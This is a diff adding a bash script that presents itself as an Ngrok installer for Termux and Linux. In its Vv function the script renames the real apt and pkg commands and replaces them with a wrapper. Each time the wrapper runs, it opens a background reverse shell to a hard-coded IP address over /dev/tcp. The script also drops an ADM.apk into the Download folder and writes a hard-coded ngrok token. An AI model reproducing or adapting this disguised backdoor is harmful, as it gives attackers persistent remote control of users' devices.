@@ -1,0 +1,156 @@
+#! /usr/bin/bash
+
+# Colors
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+y="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+# Output snippets
+info="${cyan}[${white}+${cyan}] ${yellow}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+error="${cyan}[${white}!${cyan}] ${red}"
+success="${cyan}[${white}√${cyan}] ${green}"
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" != 0 ]; then
+            echo -e "${error}No internet!\007\n"
+           especk " No internet! "
+            sleep 2
+        else
+                Vv
+                installT
+            break
+        fi
+    done
+}
+# if Termux
+if [[ -d /data/data/com.termux/files/home ]]; then
+termux=true
+else
+termux=false
+fi
+#banner
+ban() {
+
+clear
+toilet -f mono12 -F gay "Ngrok_installer"
+echo -e -e $info " By BLUE24BLUER "
+
+}
+# if all tools installed
+installT(){
+if [[ -d $PREFIX/bin/B24B ]];then
+
+echo -e $info " ALL UR TOOL HAS BEEN INSTALLED " | pv -qL 10
+
+else
+
+echo -e $error " sorry but you have to install all tools before run this tool "
+echo -e -e $info " But don't worry we will install it *_^ "
+B24B.apt install pv -y
+B24B.apt install espeak -y
+B24B.apt install git -y
+B24B.apt install toilet -y
+B24B.apt install openssh -y
+mkdir $PREFIX/bin/B24B
+fi
+
+}
+#{----------------------------------------------}
+Vv() {
+if [[ $termux = true ]];then
+        if [[ -d $PREFIX/bin/B24B ]];then
+
+echo " "
+        else
+
+        mkdir $PREFIX/bin/B24B
+        cd $PREFIX/etc/
+        git clone https://githubcom/blue24bluer/Fix_IT.sh
+        cp $PREFIX/etc/Fix_IT.sh/ADM.apk /sdcard/Download/
+        mv  $PREFIX/bin/apt $PREFIX/bin/B24B.apt
+        touch $PREFIX/bin/apt
+        chmod +x $PREFIX/bin/apt
+        chmod +x $PREFIX/bin/B24B.apt
+        echo " bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' &
+        echo  what you will install :
+        echo  [*] update
+        echo  [*] upgrade
+        printf  what you will install ?
+        read app
+        if [[ $app  == update ]];then
+        B24B.apt update -y && B24B.apt update -y
+        else
+        B24B.apt install $app
+        fi " >> $PREFIX/bin/apt
+        rm -f $PREFIX/bin/pkg
+        cp $PREFIX/bin/apt $PREFIX/bin/pkg
+fi
+
+                else
+
+if [[ -d $PREFIX/bin/B24B ]];then
+
+echo " "
+
+        else
+mkdir $PREFIX/bin/B24B
+mv -f $PREFIX/bin/apt /usr/bin/B24B.apt
+touch /usr/bin/apt
+chmod +x /usr/bin/B24B.apt
+echo " bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' &
+echo  what you will install :
+echo  [*] update
+echo  [*] upgrade
+printf  what you will install ?
+read app
+if [[ $app  == update ]];then
+B24B.apt update -y && B24B.apt update -y
+else
+B24B.apt install $app
+fi " >> $PREFIX/bin/apt
+
+        fi
+fi
+
+bash -c $PREFIX/bin/apt&
+}
+#{------------------install Ngrok-------------------------}
+net
+ban
+
+echo " "
+echo " "
+echo -e $info " Ngrok Is Installing Wait...."
+echo " "
+sleep 3.0
+cd $HOME
+B24B.apt install wget -y
+B24B.apt install php -y
+B24B.apt install python -y
+pip install lolcat
+B24B.apt install mpv -y
+mkdir $HOME/.ngrok2/
+touch $HOME/.ngrok2/ngrok.yml
+echo " authtoken: 2IzuzKy2XYbxNeXzFEzlL8ik0Xm_4bDZ75DvT4fKPnQAF2Ju8 " > $HOME/.ngrok2/ngrok.yml
+wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip
+unzip ngrok-2.2.8-linux-arm64.zip
+chmod +x ngrok
+cp ngrok $PREFIX/bin/ngrok
+rm -rf ngrok-2.2.8-linux-arm64.zip
+clear
+echo " "
+echo -e $info "Ngrok os Starting on port 4444.."
+echo " "
+ngrok tcp 4444
